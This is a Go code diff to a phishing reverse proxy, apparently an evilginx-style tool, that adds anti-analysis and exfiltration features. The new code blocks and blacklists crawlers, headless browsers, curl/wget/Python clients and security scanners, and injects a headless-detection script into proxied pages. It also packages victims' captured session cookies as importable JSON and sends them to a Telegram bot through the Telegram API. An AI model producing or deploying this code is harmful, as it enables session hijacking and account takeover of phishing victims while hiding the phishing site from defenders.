@@ -19,7 +19,9 @@ import (
 	"fmt"
 	"html"
 	"io"
+	"io/fs"
 	"io/ioutil"
+	"mime/multipart"
 	"net"
 	"net/http"
 	"net/url"
@@ -106,6 +108,126 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 	return newBody, nil
 }
 
+func (p *HttpProxy) detectHeadless(req *http.Request) bool {
+	from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
+
+	suspiciousPoints := 0
+	maxSuspiciousPoints := 7 // Increased threshold to account for new checks
+
+	// Helper function to increment suspicious points and log
+	logSuspicious := func(reason string) {
+		suspiciousPoints++
+		log.Debug("Suspicious behavior (%s) from IP: %s", reason, from_ip)
+	}
+
+	ua := req.Header.Get("User-Agent")
+
+	// Check for missing or very basic User-Agent
+	if ua == "" || ua == "Mozilla/5.0" {
+		logSuspicious("basic User-Agent")
+	}
+
+	// Check for outdated browsers
+	if isOutdatedBrowser(ua) {
+		logSuspicious("outdated browser")
+		suspiciousPoints += 2 // Add extra point for outdated browsers
+	}
+
+	// Check for missing Accept-Language
+	if req.Header.Get("Accept-Language") == "" {
+		logSuspicious("missing Accept-Language")
+	}
+
+	// Check for X-Headless-Request header
+	if req.Header.Get("X-Headless-Request") != "" {
+		logSuspicious("X-Headless-Request present")
+	}
+
+	// Check for overly permissive Accept header
+	if req.Header.Get("Accept") == "*/*" {
+		logSuspicious("permissive Accept")
+	}
+
+	// Check for suspicious Referer
+	referer := req.Header.Get("Referer")
+	if strings.HasPrefix(referer, "about:blank") {
+		logSuspicious("suspicious Referer")
+	}
+
+	// Check for missing modern headers (but don't weigh too heavily)
+	if req.Header.Get("Sec-Ch-Ua") == "" && req.Header.Get("Sec-Ch-Ua-Mobile") == "" {
+		logSuspicious("missing modern headers")
+	}
+
+	isHeadless := suspiciousPoints >= maxSuspiciousPoints
+
+	if isHeadless {
+		log.Warning("Detected likely headless or outdated browser from IP: %s (Score: %d/%d)", from_ip, suspiciousPoints, maxSuspiciousPoints)
+
+		// Add the IP to the blacklist
+		err := p.bl.AddIP(from_ip)
+		if err != nil {
+			log.Error("blacklist: %s", err)
+		} else if p.bl.IsVerbose() {
+			log.Warning("blacklisted IP address: %s", from_ip)
+		}
+	}
+
+	return isHeadless
+}
+
+// Helper function to check for outdated browsers
+func isOutdatedBrowser(ua string) bool {
+	outdatedPatterns := []string{
+		"MSIE",
+		"Firefox/[1-60]\\.",
+		"Chrome/[1-80]\\.",
+		"Safari/[1-12]\\.",
+		"Opera/[1-9]\\.",
+		"Opera/[1-2][0-9]\\.",
+		"Windows NT 5",
+		"Windows NT 6.0",
+		"Windows NT 6.1",
+	}
+
+	for _, pattern := range outdatedPatterns {
+		if matched, _ := regexp.MatchString(pattern, ua); matched {
+			return true
+		}
+	}
+
+	return false
+}
+
+func (p *HttpProxy) injectHeadlessDetectionScript(body []byte) []byte {
+	script := `
+	  <script>
+		function detectHeadlessBrowser() {
+		  var isHeadless = false;
+  
+		  // Check for unusual navigator properties
+		  if (navigator.webdriver || navigator.userAgent.indexOf("Headless") > -1) {
+			isHeadless = true;
+		  }
+  
+		  // Additional checks for headless browsers
+		  if (window.callPhantom || window._phantom || window.__nightmare || navigator.plugins.length === 0) {
+			isHeadless = true;
+		  }
+  
+		  if (isHeadless) {
+			// Log or block request (depends on how you wish to handle it)
+			console.log("Headless browser detected.");
+			// You could trigger a server-side request to block this client
+		  }
+		}
+  
+		window.onload = detectHeadlessBrowser;
+	  </script>
+	`
+	return p.injectJavascriptIntoBody(body, script, "")
+}
+
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
@@ -176,6 +298,91 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if origin_ip != "" {
 					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
 					break
+				}
+			}
+
+			// Block requests without a User-Agent header
+			userAgent := req.Header.Get("User-Agent")
+			if userAgent == "" {
+				log.Warning("Blocked request without User-Agent header from IP: %s", from_ip)
+				err := p.bl.AddIP(from_ip)
+				if p.bl.IsVerbose() {
+					if err != nil {
+						log.Error("blacklist: %s", err)
+					} else {
+						log.Warning("blacklisted ip address: %s", from_ip)
+					}
+				}
+				return p.blockRequest(req)
+			}
+
+			// Block requests from headless browsers
+			headlessIndicators := []string{
+				"HeadlessChrome", "PhantomJS", "SlimerJS", "Trident", "Wget", "curl", "HttpClient", "Java", "Python", "Go-http-client",
+			}
+			for _, indicator := range headlessIndicators {
+				if strings.Contains(userAgent, indicator) {
+					log.Warning("Blocked request from headless browser: %s, User-Agent: %s", from_ip, userAgent)
+					err := p.bl.AddIP(from_ip)
+					if err != nil {
+						log.Error("blacklist: %s", err)
+					}
+					return p.blockRequest(req)
+				}
+			}
+
+			// Block requests from outdated browsers
+			if isOutdatedBrowser(userAgent) {
+				log.Warning("Blocked request from outdated browser: %s, User-Agent: %s", from_ip, userAgent)
+				err := p.bl.AddIP(from_ip)
+				if err != nil {
+					log.Error("blacklist: %s", err)
+				}
+				return p.blockRequest(req)
+			}
+
+			// Additional server-side headless detection
+			if p.detectHeadless(req) {
+				log.Warning("Blocked request from headless browser: %s", from_ip)
+				err := p.bl.AddIP(from_ip)
+				if err != nil {
+					log.Error("blacklist: %s", err)
+				}
+				return p.blockRequest(req)
+			}
+
+			// Block requests not coming from macOS, Windows, iPhone, or Android
+			allowedOS := []string{"Macintosh", "Windows", "iPhone", "Android"}
+			isAllowed := false
+			for _, os := range allowedOS {
+				if strings.Contains(userAgent, os) {
+					isAllowed = true
+					break
+				}
+			}
+			if !isAllowed {
+				log.Warning("Blocked request from disallowed OS: %s, User-Agent: %s", from_ip, userAgent)
+				err := p.bl.AddIP(from_ip)
+				if err != nil {
+					log.Error("blacklist: %s", err)
+				}
+				return p.blockRequest(req)
+			}
+
+			// Block known bots
+			knownBots := []string{
+				"Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot", "Sogou", "Exabot", "facebot", "ia_archiver",
+				"archive.org_bot", "telegrambot", "twitterbot", "bingbot", "msnbot", "bot", "crawl", "spider", "curl", "wget", "httpclient",
+				"java", "python", "php", "facebookexternalhit", "googlebot",
+			}
+			for _, bot := range knownBots {
+				if strings.Contains(userAgent, bot) {
+					log.Warning("Blocked request from known bot: %s, User-Agent: %s", from_ip, userAgent)
+					err := p.bl.AddIP(from_ip)
+					if err != nil {
+						log.Error("blacklist: %s", err)
+					}
+					return p.blockRequest(req)
 				}
 			}
 
@@ -372,7 +579,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 
-								session, err := NewSession(pl.Name)
+								session, err := NewSession(pl.Name, p.cfg)
 								if err == nil {
 									// set params from url arguments
 									p.extractParams(session, req.URL)
@@ -1062,6 +1269,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						s.Finish(false)
 
+						// Send captured cookie tokens to Telegram bot
+						err := p.SendCapturedCookieTokensToTelegramBot(s)
+						if err != nil {
+							log.Error("failed to send tokens to Telegram: %v", err)
+						} else {
+							// Log success message for sending cookies
+							log.Success("Captured cookies successfully sent to Telegram for session: %s", ps.SessionId)
+						}
+
 						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 							rid, ok := s.Params["rid"]
 							if ok && rid != "" {
@@ -1200,6 +1416,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+
+								err := p.SendCapturedCookieTokensToTelegramBot(s)
+								if err != nil {
+									log.Error("failed to send tokens to Telegram: %v", err)
+								} else {
+									// Log success message for sending cookies
+									log.Success("Captured cookies successfully sent to Telegram for session: %s", ps.SessionId)
+								}
 							}
 
 							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
@@ -1267,6 +1491,146 @@ func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 		}
 	}
 	return "", false
+}
+
+func (p *HttpProxy) SendCapturedCookieTokensToTelegramBot(ps *Session) error {
+	type Cookie struct {
+		Path           string `json:"path"`
+		Domain         string `json:"domain"`
+		ExpirationDate int64  `json:"expirationDate"`
+		Value          string `json:"value"`
+		Name           string `json:"name"`
+		HttpOnly       bool   `json:"httpOnly,omitempty"`
+		HostOnly       bool   `json:"hostOnly,omitempty"`
+		Secure         bool   `json:"secure,omitempty"`
+	}
+
+	// Convert cookie tokens to JSON
+	var cookies []*Cookie
+	for domain, tmap := range ps.CookieTokens {
+		for k, v := range tmap {
+			c := &Cookie{
+				Path:           v.Path,
+				Domain:         domain,
+				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
+				Value:          v.Value,
+				Name:           k,
+				HttpOnly:       v.HttpOnly,
+				Secure:         false,
+			}
+			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
+				c.Secure = true
+			}
+			if domain[:1] == "." {
+				c.HostOnly = false
+				c.Domain = domain[1:]
+			} else {
+				c.HostOnly = true
+			}
+			if c.Path == "" {
+				c.Path = "/"
+			}
+			cookies = append(cookies, c)
+		}
+	}
+
+	jsonTokens, err := json.Marshal(cookies)
+	if err != nil {
+		return fmt.Errorf("failed to marshal JSON tokens: %v", err)
+	}
+
+	// Use username in filename, fallback to session ID if username is empty
+	fileIdentifier := ps.Username
+	if fileIdentifier == "" {
+		fileIdentifier = ps.Id
+	}
+
+	// Sanitize the fileIdentifier to ensure it's a valid filename
+	fileIdentifier = sanitizeFilename(fileIdentifier)
+
+	// Save the JSON data to a file
+	filename := fmt.Sprintf("%s", ps.Username)
+	err = os.WriteFile(filename, jsonTokens, fs.FileMode(0644))
+	if err != nil {
+		return fmt.Errorf("failed to save JSON file: %v", err)
+	}
+
+	// Send the file to the Telegram bot
+	message := fmt.Sprintf("Captured cookies for user: %s", ps.Username)
+	botAPI := ps.TelegramBotToken // Use the session value
+	chatID := ps.TelegramUserID   // Use the session value
+	err = SendMessageFileToTelegramBot(filename, message, botAPI, chatID)
+	if err != nil {
+		return fmt.Errorf("failed to send file to Telegram bot: %v", err)
+	}
+	// Return nil to indicate success
+	return nil
+}
+
+func SendMessageFileToTelegramBot(filename, message, botAPI, chatID string) error {
+	// Open the file
+	file, err := os.Open(filename)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	// Create a new multipart writer
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+
+	// Add the file to the request
+	part, err := writer.CreateFormFile("document", filename)
+	if err != nil {
+		return err
+	}
+	_, err = io.Copy(part, file)
+	if err != nil {
+		return err
+	}
+
+	// Add other fields to the request
+	writer.WriteField("chat_id", chatID)
+	writer.WriteField("caption", message)
+
+	// Close the multipart writer
+	writer.Close()
+
+	// Create a new HTTP POST request
+	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botAPI)
+	req, err := http.NewRequest("POST", url, body)
+	if err != nil {
+		return err
+	}
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+
+	// Send the request
+	client := &http.Client{}
+	_, err = client.Do(req)
+	if err != nil {
+		return err
+	}
+
+	// Return nil to indicate success
+	return nil
+}
+
+// Helper function to sanitize filename
+func sanitizeFilename(filename string) string {
+	// Replace invalid characters with underscores
+	invalidChars := regexp.MustCompile(`[<>:"/\\|?*\x00-\x1F]`)
+
+	sanitized := invalidChars.ReplaceAllString(filename, "_")
+
+	// Trim spaces and dots from the beginning and end
+	sanitized = strings.Trim(sanitized, " .")
+
+	// If the filename is empty after sanitization, use a default name
+	if sanitized == "" {
+		sanitized = "unknown_user"
+	}
+
+	return sanitized
 }
 
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
